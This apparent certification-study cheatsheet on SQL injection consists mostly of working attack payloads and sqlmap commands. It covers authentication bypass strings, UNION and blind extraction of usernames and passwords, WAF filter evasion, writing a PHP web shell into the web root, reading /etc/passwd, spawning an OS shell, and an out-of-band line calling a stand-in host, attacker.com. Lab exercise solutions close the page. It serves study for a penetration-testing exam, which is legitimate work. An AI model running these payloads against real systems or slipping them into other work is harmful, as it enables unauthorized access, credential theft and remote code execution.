---
title: "CWES Cheatsheet — SQL Injection"
date: 2026-03-09
categories: [Certifications, CWES]
tags: [cwes, cheatsheet, sqli, sql-injection, sqlmap]
---

sql injection is still one of the most impactful vulnerabilities out there. understand the fundamentals manually first, then let sqlmap do the heavy lifting.

---

## SQL injection fundamentals

### MySQL commands

| Command | Description |
|---|---|
| **General** | |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | login to mysql database |
| `SHOW DATABASES` | list available databases |
| `USE users` | switch to database |
| **Tables** | |
| `CREATE TABLE logins (id INT, ...)` | add a new table |
| `SHOW TABLES` | list available tables in current database |
| `DESCRIBE logins` | show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | add values to table |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | update table values. we have to specify the WHERE clause with UPDATE to specify which records get updated |
| **Columns** | |
| `SELECT * FROM table_name` | show all columns in a table |
| `SELECT column1, column2 FROM table_name` | show specific columns in a table |
| `DROP TABLE logins` | delete a table |
| `ALTER TABLE logins ADD newColumn INT` | add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | change column datatype |
| `ALTER TABLE logins DROP oldColumn` | delete column |
| **Output** | |
| `SELECT * FROM logins ORDER BY column_1` | sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | only show first two results starting from index 2 |
| `SELECT * FROM table_name WHERE <condition>` | list results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | list results where the name is similar to a given string |

### MySQL operator precedence

- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and Subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)

---

## SQL injection

### cheatsheets

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks SQL Injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html)

### identify SQLi

| Payload | URL Encoded |
|---|---|
| `'` | %27 |
| `"` | %22 |
| `#` | %23 |
| `;` | %3B |
| `)` | %29 |

### SQLi type detection

| Behavior | Type | Technique |
|---|---|---|
| you see query output/errors on page | In-Band | UNION or Error-based |
| you see different page content (true/false) | Blind Boolean | `' AND 1=1-- -` vs `' AND 1=2-- -` |
| no visible difference, but response time changes | Blind Time-based | `' AND SLEEP(5)-- -` |
| no output at all but can trigger external requests | Out-of-Band | `LOAD_FILE('\\\\attacker.com\\a')` |

### quick test order

```sql
-- 1. check for errors
'
"
' OR '1'='1
' OR '1'='2
')
")
'))
"))
')))
%'
%')
%'))
%")
1' OR '1'='1
1') OR ('1'='1
1")) OR (("1"="1
anything' AND '1'='1
anything') AND ('1'='1

-- 2. boolean blind
' AND 1=1-- -    (normal response)
' AND 1=2-- -    (different response)

-- 3. time blind
' AND SLEEP(5)-- -    (5 second delay = vulnerable)
' OR SLEEP(5)-- -

-- 4. UNION (find columns first)
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -    (increase until error)
' UNION SELECT NULL,NULL,NULL-- -
```

---

## authentication bypass

| Payload | Description |
|---|---|
| **Auth Bypass** | |
| `admin' or '1'='1` | basic auth bypass |
| `tom' or '1'='1` | log in as the user 'tom' |
| `admin')-- -` | basic auth bypass with comments |
| `any' OR id =5);#` | login as the user with the id 5 |

### auth bypass payloads list

```sql
' OR 1=1-- -
' OR 1=1#
' OR '1'='1
' OR '1'='1'-- -
' OR '1'='1'#
admin'-- -
admin'#
admin' OR '1'='1
admin' OR '1'='1'-- -
admin' OR '1'='1'#
') OR ('1'='1
') OR ('1'='1'-- -
" OR ""="
" OR 1=1-- -
```

try both `-- -` (MySQL) and `#` as comment characters. also try with and without closing parentheses `)` - depends on backend query structure.

---

## UNION injection

| Payload | Description |
|---|---|
| `' order by 1-- -` | detect number of columns using order by |
| `cn' UNION select 1,2,3-- -` | detect number of columns using union injection |
| `cn' UNION select 1,@@version,3,4-- -` | basic union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | union injection for 4 columns |
| **DB Enumeration** | |
| `SELECT @@version` | fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | list all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | list all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | list all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | dump data from a table in another database |

### UNION injection step-by-step methodology

```sql
-- step 1: find number of columns
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
-- (keep going until you get error -- last successful number = column count)

-- step 2: find which columns are displayed
' UNION SELECT 1,2,3,4-- -
-- (see which numbers appear on the page)

-- step 3: extract DB info (replace displayed column number)
' UNION SELECT 1,database(),3,4-- -
' UNION SELECT 1,user(),3,4-- -
' UNION SELECT 1,@@version,3,4-- -

-- step 4: list all databases
' UNION SELECT 1,GROUP_CONCAT(schema_name),3,4 FROM information_schema.schemata-- -

-- step 5: list tables in target DB
' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema='target_db'-- -

-- step 6: list columns in target table
' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -

-- step 7: dump data
' UNION SELECT 1,GROUP_CONCAT(username,':',password),3,4 FROM target_db.users-- -
```

use `GROUP_CONCAT()` to get all results in one row when output is limited.

---

## privileges

| Payload | Description |
|---|---|
| `cn' UNION SELECT 1, user(), 3, 4-- -` | find current user running SQL service queries on web application |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | find all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | find which directories can be accessed through MySQL |

## file injection

| Payload | Description |
|---|---|
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | write a web shell into the base web directory |

---

## error-based SQLi

```sql
-- ExtractValue (MySQL 5.1+)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))-- -

-- UpdateXML
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)-- -

-- Double query
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

error-based only works when error messages are displayed on the page.

---

## blind boolean SQLi

```sql
-- extract database name character by character
' AND SUBSTRING(database(),1,1)='a'-- -
' AND SUBSTRING(database(),1,1)='b'-- -
-- (true response = correct character)

-- using ASCII values (faster with Burp Intruder)
' AND ASCII(SUBSTRING(database(),1,1))>96-- -
' AND ASCII(SUBSTRING(database(),1,1))=100-- -

-- extract table names
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'-- -

-- extract data
' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='a'-- -
```

### blind time-based SQLi

```sql
-- confirm injection
' AND SLEEP(5)-- -

-- extract data with IF + SLEEP
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
' AND IF(ASCII(SUBSTRING(database(),1,1))>96, SLEEP(3), 0)-- -

-- extract table name
' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u', SLEEP(3), 0)-- -
```

time-based is slow manually. use sqlmap with `-r req.txt` for blind injection when you have confirmed the parameter is injectable.

---

## SQLi filter bypass techniques

| Blocked | Bypass |
|---|---|
| Space | `/**/`, `%09`, `%0a`, `+`, `()` around keywords |
| `AND` / `OR` | `&&` / `\|\|`, or `aNd` / `oR` (case) |
| `=` | `LIKE`, `BETWEEN`, `IN` |
| `UNION SELECT` | `UnIoN SeLeCt`, `/*!UNION*/ /*!SELECT*/` |
| `information_schema` | `INFORMATION_SCHEMA` (case), or use `mysql.innodb_table_stats` |
| Quotes `'` `"` | hex: `0x61646d696e` instead of `'admin'` |
| `SLEEP` | `BENCHMARK(10000000,SHA1('a'))` |
| Comments `-- -` / `#` | `;%00`, or `-- -` with extra spaces |

```sql
-- space bypass examples
UNION/**/SELECT/**/1,2,3
UNION%0aSELECT%0a1,2,3

-- quote bypass
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name=0x7573657273-- -
-- (0x7573657273 = hex for 'users')

-- MySQL inline comments bypass WAF
/*!50000UNION*/+/*!50000SELECT*/+1,2,3-- -
```

---

## SQLMAP essentials

| Command | Description |
|---|---|
| `sqlmap -h` | view the basic help menu |
| `sqlmap -hh` | view the advanced help menu |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch` | run sqlmap without asking for user input |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'` | sqlmap with POST request |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt` | passing an HTTP request file to sqlmap |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` | specifying a cookie header |
| `sqlmap -u www.target.com --data='id=1' --method PUT` | specifying a PUT request |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` | store traffic to an output file |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch` | specify verbosity level |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"` | specifying a prefix or suffix |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5` | specifying the level and risk |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` | basic DB enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb` | table enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` | table/row enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | conditional enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --schema` | database schema enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user` | searching for data |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` | password enumeration and cracking |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | anti-CSRF token bypass |
| `sqlmap --list-tampers` | list all tamper scripts |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba` | check for DBA privileges |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` | reading a local file |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | writing a file |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell` | spawning an OS shell |

### sqlmap useful flags

```bash
# use saved Burp request (easiest method)
sqlmap -r request.txt --batch --dump

# specify injection point with *
sqlmap -r request.txt -p "id" --batch

# when WAF is blocking
sqlmap -r request.txt --tamper=space2comment --batch
sqlmap -r request.txt --tamper=between --batch
sqlmap -r request.txt --tamper=randomcase --batch

# common tamper scripts
--tamper=space2comment      # replaces space with /**/
--tamper=between            # replaces > with NOT BETWEEN 0 AND
--tamper=randomcase         # random case for keywords
--tamper=charencode         # URL-encode all characters
--tamper=equaltolike        # replaces = with LIKE

# multiple tampers
sqlmap -r request.txt --tamper=space2comment,randomcase --batch

# force specific technique
--technique=U    # UNION only
--technique=B    # boolean blind only
--technique=T    # time-based blind only
--technique=E    # error-based only

# get OS shell (if FILE priv + writable directory)
sqlmap -r request.txt --os-shell --batch

# read files
sqlmap -r request.txt --file-read="/etc/passwd" --batch

# write webshell
sqlmap -r request.txt --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
```

---

## exercise cases

### case 2 - POST parameter id

detect and exploit SQLi vulnerability in POST parameter id:

```bash
sqlmap -r case2.req --batch -p 'id' --flush-session --level=5 --risk=3
sqlmap -r case2.req --batch -p 'id' --level=5 --risk=3 --dbms MySQL --dbs
sqlmap -r case2.req --batch -p 'id' --level=5 --risk=3 --dbms MySQL -D testdb -T flag2 --dump
```

### case 3 - cookie value id=1

detect and exploit SQLi vulnerability in cookie value `id=1`:

```bash
sqlmap -r case3.req --batch -p 'id' --cookie="id=1" --level=5 --risk=3 --flush-session
sqlmap -r case3.req --batch -p 'id' --cookie="id=1" --level=5 --risk=3 --dbms MySQL --dbs
sqlmap -r case3.req --batch -p 'id' --cookie="id=1" --level=5 --risk=3 --dbms MySQL -D testdb -T flag3 --dump
```

### case 4 - JSON data

detect and exploit SQLi vulnerability in JSON data `{"id": 1}`:

```bash
sqlmap -r case4.req --batch -p 'id' --level=5 --risk=3 --flush-session
sqlmap -r case4.req --batch -p 'id' --level=5 --risk=3 -dbms MySQL --dbs
sqlmap -r case4.req --batch -p 'id' --level=5 --risk=3 -dbms MySQL -D testdb -T flag4 --dump
```

### case 5 - OR SQLi in GET parameter id

detect and exploit (OR) SQLi vulnerability in GET parameter id:

```bash
sqlmap -r case5.req --batch -p 'id' --level=5 --risk=3 -dbms MySQL --dbs --flush-session
sqlmap -r case5.req --batch -p 'id' --level=5 --risk=3 -dbms MySQL -D testdb -T flag5 --dump
```

### case 6 - non-standard boundaries

detect and exploit SQLi vulnerability in GET parameter col having non-standard boundaries. test if the back tick causes a SQL query syntax error:

```bash
sqlmap -r case6.req --batch -p 'col' --level=5 --risk=3 --prefix='`)' -D testdb -T flag6 --dump --flush-session
```

### case 7 - UNION query-based technique

detect and exploit SQLi vulnerability in GET parameter id by usage of UNION query-based technique. without the `--no-cast` option sqlmap can't retrieve the tables properly:

```bash
sqlmap -r case7.req --batch -dbms MySQL --union-cols=5 -D testdb -T flag7 --dump --no-cast --flush-session
```

### case 8 - anti-CSRF token bypass

detect and exploit SQLi vulnerability in POST parameter id with anti-CSRF protection (non-standard token name):

```bash
sqlmap -r case8.req --batch -p "id" --csrf-token="t0ken" -dbms MySQL -D testdb -T flag8 --dump --flush-session --no-cast
```

### case 9 - unique uid random values

detect and exploit SQLi vulnerability in GET parameter id with unique uid random values:

```bash
sqlmap -r case9.req --batch -p "id" --randomize="uid" -dbms MySQL -D testdb -T flag9 --dump --flush-session --no-cast
```

### case 10 - primitive protection

detect and exploit SQLi vulnerability in POST parameter id with primitive protection:

```bash
sqlmap -r case10.req --batch -p "id" --random-agent -dbms MySQL -D testdb -T flag10 --dump --flush-session --no-cast
```

### case 11 - filtering characters

detect and exploit SQLi vulnerability in GET parameter id, bypass filtering of characters `<`, `>` using tamper scripts:

```bash
sqlmap -r case11.req --batch -p "id" --tamper=between -dbms MySQL -D testdb -T flag11 --dump --flush-session --no-cast
```

the `between` tamper script replaces all occurrences of greater than operator (`>`) with `NOT BETWEEN 0 AND #`, and the equals operator (`=`) with `BETWEEN # AND #`.

### OS exploitation - file read

check if user has DBA permissions:

```bash
sqlmap -r os-exploit.req --batch -p "id" --is-dba --flush-session
```

DBA = true. read flag file on OS:

```bash
sqlmap -r os-exploit.req --batch -p "id" --dbms MySQL --file-read="/var/www/html/flag.txt"
cat /home/kali/.local/share/sqlmap/output/83.136.248.28/files/_var_www_html_flag.txt
```

### OS exploitation - interactive shell

get an interactive OS shell on the remote host:

```bash
sqlmap -r os-exploit.req --batch -p "id" --os-shell
```

---

[← Back to CWES Cheatsheet Index](/posts/cwes-cheatsheet/)
